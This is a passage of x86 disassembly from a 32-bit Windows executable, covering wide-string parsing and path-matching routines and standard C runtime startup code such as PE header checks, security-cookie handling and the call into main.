  40f3e6:	push   eax
  40f3e7:	mov    edi,DWORD PTR ds:0x437540
  40f3ed:	push   esi
  40f3ee:	call   edi
  40f3f0:	pop    ecx
  40f3f1:	pop    ecx
  40f3f2:	test   eax,eax
  40f3f4:	jne    0x40f426
  40f3f6:	push   0x5c
  40f3f8:	pop    eax
  40f3f9:	push   eax
  40f3fa:	push   esi
  40f3fb:	call   edi
  40f3fd:	pop    ecx
  40f3fe:	pop    ecx
  40f3ff:	test   eax,eax
  40f401:	jne    0x40f426
  40f403:	push   0x2e
  40f405:	pop    eax
  40f406:	push   eax
  40f407:	push   esi
  40f408:	call   edi
  40f40a:	pop    ecx
  40f40b:	pop    ecx
  40f40c:	test   eax,eax
  40f40e:	je     0x40f424
  40f410:	push   0x444
  40f415:	push   DWORD PTR ds:0x4216e0
  40f41b:	call   0x405021
  40f420:	pop    ecx
  40f421:	pop    ecx
  40f422:	jmp    0x40f426
  40f424:	mov    bl,0x1
  40f426:	pop    edi
  40f427:	pop    esi
  40f428:	mov    al,bl
  40f42a:	pop    ebx
  40f42b:	leave  
  40f42c:	ret    
  40f42d:	push   ebp
  40f42e:	mov    ebp,esp
  40f430:	sub    esp,0x22c
  40f436:	mov    eax,ds:0x411018
  40f43b:	xor    eax,ebp
  40f43d:	mov    DWORD PTR [ebp-0x4],eax
  40f440:	push   ebx
  40f441:	mov    ebx,DWORD PTR [ebp+0xc]
  40f444:	push   esi
  40f445:	push   edi
  40f446:	mov    edi,DWORD PTR [ebp+0x8]
  40f449:	mov    esi,ecx
  40f44b:	movzx  eax,WORD PTR [edi]
  40f44e:	lea    edx,[esi+edx*2]
  40f451:	mov    DWORD PTR [ebp-0x218],ebx
  40f457:	mov    DWORD PTR [ebp-0x21c],edx
  40f45d:	test   ax,ax
  40f460:	je     0x40f6dd
  40f466:	and    DWORD PTR [ebp-0x220],0x0
  40f46d:	push   0x25
  40f46f:	pop    ecx
  40f470:	mov    DWORD PTR [ebp-0x228],0x7c
  40f47a:	mov    DWORD PTR [ebp-0x224],0x46
  40f484:	cmp    esi,edx
  40f486:	jae    0x40f715
  40f48c:	cmp    ax,cx
  40f48f:	jne    0x40f4c6
  40f491:	add    edi,0x2
  40f494:	movzx  eax,WORD PTR [edi]
  40f497:	test   eax,eax
  40f499:	je     0x40f710
  40f49f:	cmp    eax,ecx
  40f4a1:	je     0x40f708
  40f4a7:	cmp    eax,0x73
  40f4aa:	je     0x40f6ea
  40f4b0:	cmp    eax,0x7c
  40f4b3:	je     0x40f4ce
  40f4b5:	mov    WORD PTR [esi],cx
  40f4b8:	add    esi,0x2
  40f4bb:	cmp    esi,edx
  40f4bd:	je     0x40f715
  40f4c3:	mov    ax,WORD PTR [edi]
  40f4c6:	mov    WORD PTR [esi],ax
  40f4c9:	jmp    0x40f70b
  40f4ce:	xor    edx,edx
  40f4d0:	xor    eax,eax
  40f4d2:	lea    ecx,[edi-0x2]
  40f4d5:	mov    BYTE PTR [ebp-0x211],dl
  40f4db:	mov    BYTE PTR [ebp-0x212],dl
  40f4e1:	mov    bh,dl
  40f4e3:	mov    bl,dl
  40f4e5:	mov    WORD PTR [ebp-0x210],ax
  40f4ec:	add    edi,0x2
  40f4ef:	movzx  edx,WORD PTR [edi]
  40f4f2:	mov    eax,edx
  40f4f4:	sub    eax,0x0
  40f4f7:	je     0x40f6a6
  40f4fd:	sub    eax,0x46
  40f500:	je     0x40f530
  40f502:	sub    eax,0x1e
  40f505:	je     0x40f52c
  40f507:	dec    eax
  40f508:	je     0x40f523
  40f50a:	dec    eax
  40f50b:	je     0x40f51a
  40f50d:	sub    eax,0xa
  40f510:	jne    0x40f6a9
  40f516:	mov    bh,0x1
  40f518:	jmp    0x40f54c
  40f51a:	mov    BYTE PTR [ebp-0x212],0x1
  40f521:	jmp    0x40f54c
  40f523:	mov    BYTE PTR [ebp-0x211],0x1
  40f52a:	jmp    0x40f54c
  40f52c:	mov    bl,0x1
  40f52e:	jmp    0x40f54c
  40f530:	mov    eax,DWORD PTR [ebp-0x228]
  40f536:	cmp    WORD PTR [edi-0x2],ax
  40f53a:	jne    0x40f54c
  40f53c:	mov    bl,0x1
  40f53e:	mov    bh,bl
  40f540:	mov    BYTE PTR [ebp-0x212],bh
  40f546:	mov    BYTE PTR [ebp-0x211],bh
  40f54c:	cmp    dx,WORD PTR [ebp-0x224]
  40f553:	jne    0x40f4ec
  40f555:	mov    eax,DWORD PTR [ebp-0x218]
  40f55b:	test   eax,eax
  40f55d:	jne    0x40f572
  40f55f:	push   0x449
  40f564:	push   eax
  40f565:	call   0x405021
  40f56a:	mov    eax,DWORD PTR [ebp-0x218]
  40f570:	pop    ecx
  40f571:	pop    ecx
  40f572:	test   bl,bl
  40f574:	je     0x40f594
  40f576:	xor    ecx,ecx
  40f578:	push   ecx
  40f579:	push   ecx
  40f57a:	push   ecx
  40f57b:	push   ecx
  40f57c:	push   ecx
  40f57d:	push   ecx
  40f57e:	push   0x104
  40f583:	lea    ecx,[ebp-0x210]
  40f589:	push   ecx
  40f58a:	push   eax
  40f58b:	call   DWORD PTR ds:0x437438
  40f591:	add    esp,0x24
  40f594:	test   bh,bh
  40f596:	je     0x40f5dc
  40f598:	lea    ecx,[ebp-0x210]
  40f59e:	xor    ebx,ebx
  40f5a0:	lea    edx,[ecx+0x2]
  40f5a3:	mov    ax,WORD PTR [ecx]
  40f5a6:	add    ecx,0x2
  40f5a9:	cmp    ax,bx
  40f5ac:	jne    0x40f5a3
  40f5ae:	push   ebx
  40f5af:	push   ebx
  40f5b0:	push   ebx
  40f5b1:	sub    ecx,edx
  40f5b3:	push   ebx
  40f5b4:	sar    ecx,1
  40f5b6:	mov    eax,0x104
  40f5bb:	sub    eax,ecx
  40f5bd:	push   eax
  40f5be:	lea    eax,[ebp-0x210]
  40f5c4:	lea    eax,[eax+ecx*2]
  40f5c7:	push   eax
  40f5c8:	push   ebx
  40f5c9:	push   ebx
  40f5ca:	mov    ebx,DWORD PTR [ebp-0x218]
  40f5d0:	push   ebx
  40f5d1:	call   DWORD PTR ds:0x437438
  40f5d7:	add    esp,0x24
  40f5da:	jmp    0x40f5e2
  40f5dc:	mov    ebx,DWORD PTR [ebp-0x218]
  40f5e2:	mov    al,BYTE PTR [ebp-0x212]
  40f5e8:	test   al,al
  40f5ea:	je     0x40f62c
  40f5ec:	lea    ecx,[ebp-0x210]
  40f5f2:	lea    edx,[ecx+0x2]
  40f5f5:	mov    ax,WORD PTR [ecx]
  40f5f8:	add    ecx,0x2
  40f5fb:	cmp    ax,WORD PTR [ebp-0x220]
  40f602:	jne    0x40f5f5
  40f604:	sub    ecx,edx
  40f606:	xor    edx,edx
  40f608:	push   edx
  40f609:	push   edx
  40f60a:	sar    ecx,1
  40f60c:	mov    eax,0x104
  40f611:	sub    eax,ecx
  40f613:	push   eax
  40f614:	lea    eax,[ebp-0x210]
  40f61a:	lea    eax,[eax+ecx*2]
  40f61d:	push   eax
  40f61e:	push   edx
  40f61f:	push   edx
  40f620:	push   edx
  40f621:	push   edx
  40f622:	push   ebx
  40f623:	call   DWORD PTR ds:0x437438
  40f629:	add    esp,0x24
  40f62c:	mov    al,BYTE PTR [ebp-0x211]
  40f632:	test   al,al
  40f634:	je     0x40f676
  40f636:	lea    ecx,[ebp-0x210]
  40f63c:	lea    edx,[ecx+0x2]
  40f63f:	mov    ax,WORD PTR [ecx]
  40f642:	add    ecx,0x2
  40f645:	cmp    ax,WORD PTR [ebp-0x220]
  40f64c:	jne    0x40f63f
  40f64e:	sub    ecx,edx
  40f650:	sar    ecx,1
  40f652:	mov    eax,0x104
  40f657:	sub    eax,ecx
  40f659:	push   eax
  40f65a:	lea    eax,[ebp-0x210]
  40f660:	lea    eax,[eax+ecx*2]
  40f663:	push   eax
  40f664:	xor    eax,eax
  40f666:	push   eax
  40f667:	push   eax
  40f668:	push   eax
  40f669:	push   eax
  40f66a:	push   eax
  40f66b:	push   eax
  40f66c:	push   ebx
  40f66d:	call   DWORD PTR ds:0x437438
  40f673:	add    esp,0x24
  40f676:	cmp    WORD PTR [ebp-0x210],0x0
  40f67e:	mov    edx,DWORD PTR [ebp-0x21c]
  40f684:	je     0x40f6cb
  40f686:	lea    ecx,[ebp-0x210]
  40f68c:	sub    ecx,esi
  40f68e:	cmp    esi,edx
  40f690:	jae    0x40f6cb
  40f692:	mov    ax,WORD PTR [ecx+esi*1]
  40f696:	mov    WORD PTR [esi],ax
  40f699:	add    esi,0x2
  40f69c:	xor    eax,eax
  40f69e:	cmp    WORD PTR [ecx+esi*1],ax
  40f6a2:	jne    0x40f68e
  40f6a4:	jmp    0x40f6cb
  40f6a6:	sub    edi,0x2
  40f6a9:	mov    edx,DWORD PTR [ebp-0x21c]
  40f6af:	jmp    0x40f6c1
  40f6b1:	cmp    esi,edx
  40f6b3:	jae    0x40f6c5
  40f6b5:	mov    ax,WORD PTR [ecx]
  40f6b8:	mov    WORD PTR [esi],ax
  40f6bb:	add    esi,0x2
  40f6be:	add    ecx,0x2
  40f6c1:	cmp    ecx,edi
  40f6c3:	jbe    0x40f6b1
  40f6c5:	mov    ebx,DWORD PTR [ebp-0x218]
  40f6cb:	push   0x25
  40f6cd:	pop    ecx
  40f6ce:	add    edi,0x2
  40f6d1:	movzx  eax,WORD PTR [edi]
  40f6d4:	test   ax,ax
  40f6d7:	jne    0x40f484
  40f6dd:	cmp    esi,edx
  40f6df:	jae    0x40f715
  40f6e1:	xor    eax,eax
  40f6e3:	mov    WORD PTR [esi],ax
  40f6e6:	xor    al,al
  40f6e8:	jmp    0x40f717
  40f6ea:	test   ebx,ebx
  40f6ec:	je     0x40f6ce
  40f6ee:	mov    eax,ebx
  40f6f0:	movzx  ecx,WORD PTR [eax]
  40f6f3:	test   cx,cx
  40f6f6:	je     0x40f6cb
  40f6f8:	cmp    esi,edx
  40f6fa:	jae    0x40f6cb
  40f6fc:	mov    WORD PTR [esi],cx
  40f6ff:	add    esi,0x2
  40f702:	inc    eax
  40f703:	inc    eax
  40f704:	jne    0x40f6f0
  40f706:	jmp    0x40f6cb
  40f708:	mov    WORD PTR [esi],cx
  40f70b:	add    esi,0x2
  40f70e:	jmp    0x40f6ce
  40f710:	sub    edi,0x2
  40f713:	jmp    0x40f6ce
  40f715:	mov    al,0x1
  40f717:	mov    ecx,DWORD PTR [ebp-0x4]
  40f71a:	pop    edi
  40f71b:	pop    esi
  40f71c:	xor    ecx,ebp
  40f71e:	pop    ebx
  40f71f:	call   0x40fd0b
  40f724:	leave  
  40f725:	ret    0x8
  40f728:	push   ebp
  40f729:	mov    ebp,esp
  40f72b:	push   ecx
  40f72c:	push   ecx
  40f72d:	mov    eax,DWORD PTR [ebp+0x8]
  40f730:	push   ebx
  40f731:	push   esi
  40f732:	push   edi
  40f733:	mov    edi,DWORD PTR [eax*4+0x4214c0]
  40f73a:	mov    DWORD PTR [ebp-0x8],ecx
  40f73d:	mov    DWORD PTR [ebp-0x4],edi
  40f740:	test   edi,edi
  40f742:	je     0x40f7d3
  40f748:	push   0x5c
  40f74a:	xor    edx,edx
  40f74c:	pop    esi
  40f74d:	mov    eax,DWORD PTR [edi+0x4]
  40f750:	mov    ebx,ecx
  40f752:	mov    DWORD PTR [ebp+0x8],eax
  40f755:	cmp    WORD PTR [ecx],dx
  40f758:	je     0x40f7bc
  40f75a:	push   0x2f
  40f75c:	pop    edi
  40f75d:	movzx  ecx,WORD PTR [eax]
  40f760:	test   cx,cx
  40f763:	je     0x40f7b3
  40f765:	movzx  edx,WORD PTR [ebx]
  40f768:	cmp    dx,si
  40f76b:	je     0x40f795
  40f76d:	cmp    dx,di
  40f770:	je     0x40f795
  40f772:	push   ecx
  40f773:	call   DWORD PTR ds:0x43740c
  40f779:	mov    si,ax
  40f77c:	movzx  eax,WORD PTR [ebx]
  40f77f:	push   eax
  40f780:	call   DWORD PTR ds:0x43740c
  40f786:	pop    ecx
  40f787:	cmp    ax,si
  40f78a:	mov    eax,DWORD PTR [ebp+0x8]
  40f78d:	pop    ecx
  40f78e:	jne    0x40f7b1
  40f790:	push   0x5c
  40f792:	pop    esi
  40f793:	jmp    0x40f79f
  40f795:	cmp    cx,si
  40f798:	je     0x40f79f
  40f79a:	cmp    cx,di
  40f79d:	jne    0x40f7b1
  40f79f:	add    ebx,0x2
  40f7a2:	add    eax,0x2
  40f7a5:	xor    edx,edx
  40f7a7:	mov    DWORD PTR [ebp+0x8],eax
  40f7aa:	cmp    WORD PTR [ebx],dx
  40f7ad:	jne    0x40f75d
  40f7af:	jmp    0x40f7b3
  40f7b1:	xor    edx,edx
  40f7b3:	mov    edi,DWORD PTR [ebp-0x4]
  40f7b6:	mov    ecx,DWORD PTR [ebp-0x8]
  40f7b9:	push   0x5c
  40f7bb:	pop    esi
  40f7bc:	cmp    WORD PTR [ebx],dx
  40f7bf:	jne    0x40f7c6
  40f7c1:	cmp    WORD PTR [eax],dx
  40f7c4:	je     0x40f7dc
  40f7c6:	mov    edi,DWORD PTR [edi]
  40f7c8:	mov    DWORD PTR [ebp-0x4],edi
  40f7cb:	test   edi,edi
  40f7cd:	jne    0x40f74d
  40f7d3:	xor    eax,eax
  40f7d5:	pop    edi
  40f7d6:	pop    esi
  40f7d7:	pop    ebx
  40f7d8:	leave  
  40f7d9:	ret    0x4
  40f7dc:	mov    eax,edi
  40f7de:	jmp    0x40f7d5
  40f7e0:	push   ebp
  40f7e1:	mov    ebp,esp
  40f7e3:	sub    esp,0xc
  40f7e6:	mov    eax,ds:0x411018
  40f7eb:	xor    eax,ebp
  40f7ed:	mov    DWORD PTR [ebp-0x4],eax
  40f7f0:	push   ebx
  40f7f1:	push   esi
  40f7f2:	push   edi
  40f7f3:	xor    ebx,ebx
  40f7f5:	mov    edi,edx
  40f7f7:	mov    esi,ecx
  40f7f9:	lea    edx,[ecx+0x2]
  40f7fc:	mov    DWORD PTR [ebp-0xc],ebx
  40f7ff:	mov    ax,WORD PTR [ecx]
  40f802:	add    ecx,0x2
  40f805:	cmp    ax,bx
  40f808:	jne    0x40f7ff
  40f80a:	sub    ecx,edx
  40f80c:	sar    ecx,1
  40f80e:	lea    eax,[ecx*2+0x2]
  40f815:	call   0x410420
  40f81a:	mov    ecx,edi
  40f81c:	mov    ebx,esp
  40f81e:	mov    DWORD PTR [ebp-0x8],ebx
  40f821:	lea    edx,[ecx+0x2]
  40f824:	mov    ax,WORD PTR [ecx]
  40f827:	add    ecx,0x2
  40f82a:	cmp    ax,WORD PTR [ebp-0xc]
  40f82e:	jne    0x40f824
  40f830:	sub    ecx,edx
  40f832:	sar    ecx,1
  40f834:	lea    eax,[ecx*2+0x2]
  40f83b:	call   0x410420
  40f840:	mov    edx,esp
  40f842:	push   0x22
  40f844:	pop    eax
  40f845:	cmp    WORD PTR [esi],ax
  40f848:	jne    0x40f84d
  40f84a:	add    esi,0x2
  40f84d:	mov    ecx,ebx
  40f84f:	movzx  ebx,WORD PTR [esi]
  40f852:	test   bx,bx
  40f855:	je     0x40f880
  40f857:	sub    esi,DWORD PTR [ebp-0x8]
  40f85a:	mov    WORD PTR [ecx],bx
  40f85d:	add    ecx,0x2
  40f860:	movzx  eax,WORD PTR [esi+ecx*1]
  40f864:	mov    ebx,eax
  40f866:	test   ax,ax
  40f869:	jne    0x40f85a
  40f86b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f86e:	cmp    ecx,ebx
  40f870:	je     0x40f883
  40f872:	push   0x22
  40f874:	pop    esi
  40f875:	cmp    WORD PTR [ecx-0x2],si
  40f879:	jne    0x40f883
  40f87b:	add    ecx,0xfffffffe
  40f87e:	jmp    0x40f883
  40f880:	mov    ebx,DWORD PTR [ebp-0x8]
  40f883:	xor    eax,eax
  40f885:	mov    WORD PTR [ecx],ax
  40f888:	push   0x22
  40f88a:	pop    eax
  40f88b:	cmp    WORD PTR [edi],ax
  40f88e:	jne    0x40f893
  40f890:	add    edi,0x2
  40f893:	movzx  esi,WORD PTR [edi]
  40f896:	mov    ecx,edx
  40f898:	test   si,si
  40f89b:	je     0x40f8c0
  40f89d:	sub    edi,edx
  40f89f:	mov    WORD PTR [ecx],si
  40f8a2:	add    ecx,0x2
  40f8a5:	movzx  eax,WORD PTR [edi+ecx*1]
  40f8a9:	mov    esi,eax
  40f8ab:	test   ax,ax
  40f8ae:	jne    0x40f89f
  40f8b0:	cmp    ecx,edx
  40f8b2:	je     0x40f8c0
  40f8b4:	push   0x22
  40f8b6:	pop    esi
  40f8b7:	cmp    WORD PTR [ecx-0x2],si
  40f8bb:	jne    0x40f8c0
  40f8bd:	add    ecx,0xfffffffe
  40f8c0:	push   edx
  40f8c1:	xor    eax,eax
  40f8c3:	push   ebx
  40f8c4:	mov    WORD PTR [ecx],ax
  40f8c7:	call   DWORD PTR ds:0x437548
  40f8cd:	pop    ecx
  40f8ce:	pop    ecx
  40f8cf:	lea    esp,[ebp-0x18]
  40f8d2:	pop    edi
  40f8d3:	pop    esi
  40f8d4:	pop    ebx
  40f8d5:	mov    ecx,DWORD PTR [ebp-0x4]
  40f8d8:	xor    ecx,ebp
  40f8da:	call   0x40fd0b
  40f8df:	leave  
  40f8e0:	ret    
  40f8e1:	push   ebx
  40f8e2:	push   esi
  40f8e3:	push   edi
  40f8e4:	push   0x2
  40f8e6:	mov    esi,ecx
  40f8e8:	lea    edx,[ecx+0x2]
  40f8eb:	pop    ebx
  40f8ec:	mov    ax,WORD PTR [ecx]
  40f8ef:	add    ecx,ebx
  40f8f1:	test   ax,ax
  40f8f4:	jne    0x40f8ec
  40f8f6:	sub    ecx,edx
  40f8f8:	sar    ecx,1
  40f8fa:	lea    eax,[ecx+0x1]
  40f8fd:	xor    ecx,ecx
  40f8ff:	mul    ebx
  40f901:	seto   cl
  40f904:	neg    ecx
  40f906:	or     ecx,eax
  40f908:	call   0x40a2fb
  40f90d:	push   0x22
  40f90f:	mov    edi,eax
  40f911:	pop    eax
  40f912:	cmp    WORD PTR [esi],ax
  40f915:	jne    0x40f919
  40f917:	add    esi,ebx
  40f919:	movzx  edx,WORD PTR [esi]
  40f91c:	mov    ecx,edi
  40f91e:	test   dx,dx
  40f921:	je     0x40f935
  40f923:	sub    esi,edi
  40f925:	mov    WORD PTR [ecx],dx
  40f928:	add    ecx,ebx
  40f92a:	movzx  eax,WORD PTR [esi+ecx*1]
  40f92e:	mov    edx,eax
  40f930:	test   ax,ax
  40f933:	jne    0x40f925
  40f935:	push   0x22
  40f937:	pop    edx
  40f938:	cmp    WORD PTR [ecx-0x2],dx
  40f93c:	jne    0x40f941
  40f93e:	add    ecx,0xfffffffe
  40f941:	xor    eax,eax
  40f943:	mov    WORD PTR [ecx],ax
  40f946:	mov    eax,edi
  40f948:	pop    edi
  40f949:	pop    esi
  40f94a:	pop    ebx
  40f94b:	ret    
  40f94c:	push   esi
  40f94d:	push   edi
  40f94e:	push   0x22
  40f950:	mov    esi,ecx
  40f952:	pop    eax
  40f953:	mov    edi,edx
  40f955:	cmp    WORD PTR [esi],ax
  40f958:	jne    0x40f984
  40f95a:	push   eax
  40f95b:	push   esi
  40f95c:	call   DWORD PTR ds:0x43745c
  40f962:	pop    ecx
  40f963:	pop    ecx
  40f964:	xor    ecx,ecx
  40f966:	lea    edx,[esi+0x2]
  40f969:	mov    WORD PTR [eax],cx
  40f96c:	movzx  eax,WORD PTR [edx]
  40f96f:	mov    WORD PTR [esi],ax
  40f972:	jmp    0x40f97f
  40f974:	lea    ecx,[edx]
  40f976:	lea    edx,[ecx+0x2]
  40f979:	movzx  eax,WORD PTR [edx]
  40f97c:	mov    WORD PTR [ecx],ax
  40f97f:	test   ax,ax
  40f982:	jne    0x40f974
  40f984:	push   0x20
  40f986:	push   edi
  40f987:	push   esi
  40f988:	call   DWORD PTR ds:0x4373dc
  40f98e:	add    esp,0xc
  40f991:	pop    edi
  40f992:	pop    esi
  40f993:	ret    
  40f994:	push   esi
  40f995:	xor    esi,esi
  40f997:	test   ecx,ecx
  40f999:	je     0x40f9b1
  40f99b:	cmp    edx,0x7ffffffc
  40f9a1:	ja     0x40f9ca
  40f9a3:	lea    eax,[edx+edx*1]
  40f9a6:	push   eax
  40f9a7:	push   ecx
  40f9a8:	call   DWORD PTR ds:0x4373e4
  40f9ae:	pop    ecx
  40f9af:	jmp    0x40f9c3
  40f9b1:	cmp    edx,0x7ffffffc
  40f9b7:	ja     0x40f9ca
  40f9b9:	lea    eax,[edx+edx*1]
  40f9bc:	push   eax
  40f9bd:	call   DWORD PTR ds:0x4373e8
  40f9c3:	mov    esi,eax
  40f9c5:	pop    ecx
  40f9c6:	test   esi,esi
  40f9c8:	jne    0x40f9dc
  40f9ca:	push   0x41b
  40f9cf:	push   DWORD PTR ds:0x4216e0
  40f9d5:	call   0x405021
  40f9da:	pop    ecx
  40f9db:	pop    ecx
  40f9dc:	mov    eax,esi
  40f9de:	pop    esi
  40f9df:	ret    
  40f9e0:	push   ebp
  40f9e1:	mov    ebp,esp
  40f9e3:	sub    esp,0x264
  40f9e9:	mov    eax,ds:0x411018
  40f9ee:	xor    eax,ebp
  40f9f0:	mov    DWORD PTR [ebp-0x4],eax
  40f9f3:	push   ebx
  40f9f4:	push   esi
  40f9f5:	push   edi
  40f9f6:	lea    eax,[ebp-0x260]
  40f9fc:	push   eax
  40f9fd:	lea    edx,[ebp-0x258]
  40fa03:	mov    ebx,ecx
  40fa05:	call   0x40726d
  40fa0a:	mov    esi,eax
  40fa0c:	test   esi,esi
  40fa0e:	je     0x40fa5d
  40fa10:	call   0x40dcc8
  40fa15:	mov    edx,esi
  40fa17:	mov    ecx,ebx
  40fa19:	mov    edi,eax
  40fa1b:	call   0x40f26d
  40fa20:	mov    DWORD PTR [edi+0x4],eax
  40fa23:	jmp    0x40fa40
  40fa25:	call   0x40dcc8
  40fa2a:	mov    edx,DWORD PTR [ebp-0x25c]
  40fa30:	mov    ecx,ebx
  40fa32:	mov    esi,eax
  40fa34:	call   0x40f26d
  40fa39:	mov    DWORD PTR [esi],edi
  40fa3b:	mov    DWORD PTR [esi+0x4],eax
  40fa3e:	mov    edi,esi
  40fa40:	mov    edx,DWORD PTR [ebp-0x260]
  40fa46:	lea    ecx,[ebp-0x258]
  40fa4c:	call   0x4073f5
  40fa51:	mov    DWORD PTR [ebp-0x25c],eax
  40fa57:	test   eax,eax
  40fa59:	jne    0x40fa25
  40fa5b:	mov    eax,edi
  40fa5d:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa60:	pop    edi
  40fa61:	pop    esi
  40fa62:	xor    ecx,ebp
  40fa64:	pop    ebx
  40fa65:	call   0x40fd0b
  40fa6a:	leave  
  40fa6b:	ret    
  40fa6c:	call   DWORD PTR ds:0x43734c
  40fa72:	cmp    al,0x6
  40fa74:	jae    0x40fa95
  40fa76:	push   0x4016bc
  40fa7b:	call   DWORD PTR ds:0x4372f0
  40fa81:	push   0x401068
  40fa86:	push   eax
  40fa87:	call   DWORD PTR ds:0x4372f4
  40fa8d:	test   eax,eax
  40fa8f:	je     0x40fa95
  40fa91:	push   0x1
  40fa93:	call   eax
  40fa95:	xor    eax,eax
  40fa97:	ret    
  40fa98:	mov    eax,0x5a4d
  40fa9d:	cmp    WORD PTR ds:0x400000,ax
  40faa4:	je     0x40faaa
  40faa6:	xor    eax,eax
  40faa8:	jmp    0x40fade
  40faaa:	mov    ecx,DWORD PTR ds:0x40003c
  40fab0:	cmp    DWORD PTR [ecx+0x400000],0x4550
  40faba:	jne    0x40faa6
  40fabc:	mov    eax,0x10b
  40fac1:	cmp    WORD PTR [ecx+0x400018],ax
  40fac8:	jne    0x40faa6
  40faca:	xor    eax,eax
  40facc:	cmp    DWORD PTR [ecx+0x400074],0xe
  40fad3:	jbe    0x40fade
  40fad5:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40fadb:	setne  al
  40fade:	push   0x1
  40fae0:	mov    ds:0x411178,eax
  40fae5:	call   DWORD PTR ds:0x4374e0
  40faeb:	pop    ecx
  40faec:	push   0xffffffff
  40faee:	call   DWORD PTR ds:0x4373bc
  40faf4:	mov    ecx,DWORD PTR ds:0x437500
  40fafa:	mov    ds:0x436300,eax
  40faff:	mov    ds:0x436304,eax
  40fb04:	mov    eax,ds:0x4114ac
  40fb09:	mov    DWORD PTR [ecx],eax
  40fb0b:	mov    ecx,DWORD PTR ds:0x437504
  40fb11:	mov    eax,ds:0x4114a0
  40fb16:	mov    DWORD PTR [ecx],eax
  40fb18:	call   0x410271
  40fb1d:	call   0x40ff86
  40fb22:	cmp    DWORD PTR ds:0x411000,0x0
  40fb29:	jne    0x40fb37
  40fb2b:	push   0x40ff86
  40fb30:	call   DWORD PTR ds:0x4374f0
  40fb36:	pop    ecx
  40fb37:	call   0x4102b1
  40fb3c:	cmp    DWORD PTR ds:0x411010,0xffffffff
  40fb43:	jne    0x40fb4e
  40fb45:	push   0xffffffff
  40fb47:	call   DWORD PTR ds:0x4374ec
  40fb4d:	pop    ecx
  40fb4e:	xor    eax,eax
  40fb50:	ret    
  40fb51:	push   0x410291
  40fb56:	call   0x41025c
  40fb5b:	mov    eax,ds:0x4114a8
  40fb60:	mov    DWORD PTR [esp],0x41117c
  40fb67:	push   DWORD PTR ds:0x4114a4
  40fb6d:	mov    ds:0x41117c,eax
  40fb72:	push   0x411170
  40fb77:	push   0x41116c
  40fb7c:	push   0x411168
  40fb81:	call   DWORD PTR ds:0x4374dc
  40fb87:	add    esp,0x14
  40fb8a:	mov    ds:0x411174,eax
  40fb8f:	test   eax,eax
  40fb91:	jns    0x40fb9b
  40fb93:	push   0x8
  40fb95:	call   0x40ff80
  40fb9a:	pop    ecx
  40fb9b:	ret    
  40fb9c:	push   0xc
  40fb9e:	push   0x410488
  40fba3:	call   0x4102f0
  40fba8:	xor    ebx,ebx
  40fbaa:	mov    DWORD PTR [ebp-0x4],ebx
  40fbad:	mov    eax,fs:0x18
  40fbb3:	mov    edx,DWORD PTR [eax+0x4]
  40fbb6:	mov    edi,ebx
  40fbb8:	mov    esi,0x4362f8
  40fbbd:	mov    ecx,edx
  40fbbf:	xor    eax,eax
  40fbc1:	lock cmpxchg DWORD PTR [esi],ecx
  40fbc5:	test   eax,eax
  40fbc7:	je     0x40fbd4
  40fbc9:	cmp    eax,edx
  40fbcb:	jne    0x40fbbd
  40fbcd:	xor    esi,esi
  40fbcf:	inc    esi
  40fbd0:	mov    edi,esi
  40fbd2:	jmp    0x40fbd7
  40fbd4:	xor    esi,esi
  40fbd6:	inc    esi
  40fbd7:	cmp    DWORD PTR ds:0x4362fc,esi
  40fbdd:	jne    0x40fbe9
  40fbdf:	push   0x1f
  40fbe1:	call   0x40ff80
  40fbe6:	pop    ecx
  40fbe7:	jmp    0x40fc23
  40fbe9:	cmp    DWORD PTR ds:0x4362fc,ebx
  40fbef:	jne    0x40fc1d
  40fbf1:	mov    DWORD PTR ds:0x4362fc,esi
  40fbf7:	push   0x401020
  40fbfc:	push   0x40100c
  40fc01:	call   0x4102d8
  40fc06:	pop    ecx
  40fc07:	pop    ecx
  40fc08:	test   eax,eax
  40fc0a:	je     0x40fc23
  40fc0c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40fc13:	mov    eax,0xff
  40fc18:	jmp    0x40fcfb
  40fc1d:	mov    DWORD PTR ds:0x411164,esi
  40fc23:	cmp    DWORD PTR ds:0x4362fc,esi
  40fc29:	jne    0x40fc46
  40fc2b:	push   0x401008
  40fc30:	push   0x401000
  40fc35:	call   0x4102de
  40fc3a:	pop    ecx
  40fc3b:	pop    ecx
  40fc3c:	mov    DWORD PTR ds:0x4362fc,0x2
  40fc46:	test   edi,edi
  40fc48:	jne    0x40fc53
  40fc4a:	xor    eax,eax
  40fc4c:	mov    ecx,0x4362f8
  40fc51:	xchg   DWORD PTR [ecx],eax
  40fc53:	cmp    DWORD PTR ds:0x436308,0x0
  40fc5a:	je     0x40fc75
  40fc5c:	push   0x436308
  40fc61:	call   0x40fff0
  40fc66:	pop    ecx
  40fc67:	test   eax,eax
  40fc69:	je     0x40fc75
  40fc6b:	push   ebx
  40fc6c:	push   0x2
  40fc6e:	push   ebx
  40fc6f:	call   DWORD PTR ds:0x436308
  40fc75:	mov    ecx,DWORD PTR ds:0x411170
  40fc7b:	mov    eax,ds:0x4374fc
  40fc80:	mov    DWORD PTR [eax],ecx
  40fc82:	push   DWORD PTR ds:0x411170
  40fc88:	push   DWORD PTR ds:0x41116c
  40fc8e:	push   DWORD PTR ds:0x411168
  40fc94:	call   0x40afd6
  40fc99:	add    esp,0xc
  40fc9c:	mov    ds:0x411160,eax
  40fca1:	cmp    DWORD PTR ds:0x411178,0x0
  40fca8:	jne    0x40fce0
  40fcaa:	push   eax
  40fcab:	call   DWORD PTR ds:0x4373ec
  40fcb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fcb4:	mov    eax,DWORD PTR [ecx]
  40fcb6:	mov    eax,DWORD PTR [eax]
  40fcb8:	mov    DWORD PTR [ebp-0x1c],eax
  40fcbb:	push   ecx
  40fcbc:	push   eax
  40fcbd:	call   0x40ff7a
  40fcc2:	pop    ecx
  40fcc3:	pop    ecx
  40fcc4:	ret    
  40fcc5:	mov    esp,DWORD PTR [ebp-0x18]
  40fcc8:	mov    eax,DWORD PTR [ebp-0x1c]
  40fccb:	mov    ds:0x411160,eax
  40fcd0:	cmp    DWORD PTR ds:0x411178,0x0
  40fcd7:	jne    0x40fce0
  40fcd9:	push   eax
  40fcda:	call   DWORD PTR ds:0x4374e4
  40fce0:	cmp    DWORD PTR ds:0x411164,0x0
  40fce7:	jne    0x40fcf4
  40fce9:	call   DWORD PTR ds:0x4374e8
  40fcef:	mov    eax,ds:0x411160
  40fcf4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
